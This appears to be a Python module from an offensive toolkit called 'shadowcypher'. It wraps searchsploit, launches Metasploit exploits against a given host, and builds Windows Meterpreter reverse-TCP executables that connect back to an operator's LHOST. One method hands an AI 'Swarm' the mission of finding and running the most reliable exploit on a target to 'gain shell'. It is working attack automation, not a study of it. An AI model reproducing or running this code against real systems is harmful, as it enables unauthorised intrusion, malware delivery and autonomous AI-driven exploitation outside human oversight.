"""
PocEngine Module — Enterprise Intelligence Build.
Handles Metasploit, Searchsploit, and custom payload delivery.
"""

import shutil

from shadowcypher.core.module import BaseModule
from shadowcypher.core.sanitize import validate_target
from shadowcypher.core.stealth import require_stealth


class PocEngine(BaseModule):
    """The 'Dagger' engine for offensive operations."""

    def __init__(self):
        super().__init__(module_name="exploit")

    def search_exploits(self, query, on_output=None):
        self.log(f"SEARCHING_FOR_EXPLOITS: {query}")
        # searchsploit is part of exploitdb package
        if shutil.which("searchsploit"):
            return self.execute(f"SEARCH_{query}", ["searchsploit", query, "--json"], callback=on_output)
        if on_output:
            on_output("[EXPLOIT] searchsploit not found. Install: sudo apt install exploitdb\n")
        return None

    def launch_msf_exploit(self, module, target, options=None, on_output=None):
        require_stealth(on_output=on_output)
        if not validate_target(target):
            return
        self.log(f"LAUNCHING_MSF_EXPLOIT: {module} ON {target}")
        msf = self.get_tool_path("msfconsole")

        # Build MSF inline command
        opts = " ".join([f"set {k} {v}" for k, v in (options or {}).items()])
        cmd_str = f"use {module}; set RHOSTS {target}; {opts}; run; exit"

        return self.execute(f"MSF_{target}", [msf, "-x", cmd_str], callback=on_output)

    def generate_payload(self, ptype, lhost, lport, on_output=None):
        require_stealth(on_output=on_output)
        self.log(f"GENERATING_PAYLOAD: {ptype} -> {lhost}:{lport}")
        msfvenom = self.get_tool_path("msfvenom")
        # Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe
        args = [msfvenom, "-p", ptype, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe"]
        return self.execute("PAYLOAD_GEN", args, callback=on_output)

    def auto_exploit(self, target, cve=None, on_output=None):
        """Escalate to the Swarm for precision exploitation."""
        from shadowcypher.core.hub import hub
        self.log(f"AUTO_EXPLOIT_INITIATED: {target} [CVE={cve}]", "AI")
        return hub.dispatch_mission(f"Identify and execute the most reliable exploit for {cve or 'detected services'} on {target}. Gain shell.")
